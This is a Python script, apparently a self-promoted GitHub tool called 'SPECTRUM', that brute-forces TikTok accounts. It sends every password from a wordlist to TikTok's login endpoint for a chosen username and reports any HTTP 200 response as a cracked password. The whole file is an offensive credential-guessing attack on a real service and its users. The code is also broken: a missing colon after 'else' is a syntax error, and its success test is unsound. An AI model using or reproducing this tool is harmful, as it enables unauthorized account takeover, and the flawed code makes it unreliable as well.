import requests
from subprocess import call
from colorama import Fore, Style, Back, init

init()

red = Fore.LIGHTRED_EX
blue = Fore.LIGHTBLUE_EX
reset = Style.RESET_ALL
green = Fore.LIGHTGREEN_EX
yellow = Fore.YELLOW
magenta = Fore.LIGHTMAGENTA_EX

adv = yellow + "[+]" + magenta

call(["clear"])

print()

print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⢀⣼⣷⣦⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣩⠙⢷⣦⠀⣴⣿⣿⠃⢀⣄⢠⡞⠉⠝⠩⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢫⣿⢷⣾⣿⢛⣿⣿⠁⠀⠈⢹⠋⢠⣤⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡀⠙⠻⣥⡾⠟⣻⡿⣥⡙⣷⢤⣴⣿⣶⣄⠁⣴⣃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠈⠙⢾⣏⣱⣿⣻⣷⣴⣿⣿⣿⣿⠟⠁⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠀⢀⣀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡎⡀⢀⣾⣽⡷⣄⡀⠀⠀⠙⠻⣿⣿⣿⣿⣾⣟⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣯⠟⢁⡵⠞⢾⣟⣿⣿⣻⣦⣄⠀⠀⠈⠙⢿⣿⣿⣿⣿⣧⡀⠙⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣺⠽⠚⢉⣠⣶⠏⣳⠾⢃⣿⣿⣡⡟⢧⠾⠷⣦⣤⣶⣿⢾⣿⣿⣿⣿⣿⣦⣄⣨⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣤⣶⠿⠛⢉⣠⣴⠞⢩⡾⠃⣼⠛⢠⡟⢉⣼⠟⢷⣾⣶⣾⠿⠿⢿⣥⣾⣿⣷⡝⠿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀
⢸⠻⠋⣡⣴⡾⢉⡶⠇⣰⠟⢁⡬⠁⢠⠇⢀⢸⣿⣦⣀⣿⡯⢠⢾⣿⣶⡦⢿⣿⠋⣠⠶⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⢹⣷⣤⡀⠀⠀⠀
⠸⡄⠸⣯⡇⢰⠾⢁⣤⠋⢠⡎⠀⠴⢂⣤⠞⢋⣠⣤⠿⢯⡀⡏⣾⣿⠋⠀⠀⠈⠓⠦⣄⠻⣭⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣻⢿⣇⡙⢶⣄⠀
⢠⣽⣦⡈⠙⢾⣀⡌⠁⠴⠆⢀⡼⠟⢋⣤⣾⠟⠉⠀⠀⠀⠙⣿⣿⡏⠀⠀⠀⠀⠀⠀⢸⠀⠬⠙⢿⣏⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⠀⠙⠀
⠈⠻⣿⣿⣦⡀⠉⠳⣼⡧⠞⢋⣤⣴⠿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠻⣝⢦⣀⠀⠀⠀⣠⠞⢀⡴⠛⠳⢿⣿⣹⣄⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠙⢿⣿⣦⣀⠀⢀⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠮⣝⠒⠮⠅⣰⠋⠀⠀⠀⠀⠉⠳⢌⡑⢦⡀⠉⠻⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣷⣾⣏⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⣴⠃⣀⡀⠀⠀⠀⠀⠀⠀⠙⠲⣌⡓⢤⡀⣹⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠒⠒⠛⠒⠒⠒⠒⠚⠛⠛⠚⠛⠛⠛⠛⠛⠛⠛⠓""")

print(" ________________________________________________________________")

print()

print("              SPECTRUM - BRUTE FORCE TOOL OF TIKTOK")


print()

print("               https://github.com/sk-k1ng/spectrum" + reset)

print(" ________________________________________________________________")

print()
print()
print()

print(blue + " > DO NOT ADD THE '@'")
user = input(yellow + " > user: " + reset)

print()

print(blue, "> IT MUST BE IN THIS DIRECTORY OR USE THE DEFAULT 'wordlist.txt'")
wordlist = input(yellow + " > wordlist: " + reset)

print()

password = None

def brute_force(user, password, wordlist):
    call(["clear"])
    with open(wordlist, 'r') as f:
        words = f.readlines()
    for i, word in enumerate(words):
        word = word.strip()
        print(adv, f"cracking account...",f"{i+1}/{len(words)}", reset)
        response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
            "username": user,
            "password": word,
            "mix_mode": True,
            "captcha": "",
            "email": "",
            "mobile": "",
            "account": "",
            "type": 1,
            "app_id": 1233,
            "device_id": "",
            "iid": "",
            "os_version": "",
            "channel": "",
            "device_platform": "",
            "request_id": "",
            "captcha_app": "",
            "captcha_type": "",
            "google_account": "",
            "google_captcha": "",
            "google_token": "",
            "fb_account": "",
            "fb_code": "",
            "fb_token": "",
            "apple_id": "",
            "apple_token": "",
            "apple_email": "",
            "apple_code": "",
            "mix_string": word
        })
        if response.status_code == 200:
            print()
            print(green + f" success! password is {word}" + reset)
            break
        else
            print()
            print(red + f"failed! password not found in {wordlist}" + reset)

                                                                
brute_force(user, password, wordlist)

# CREATED BY SK KING
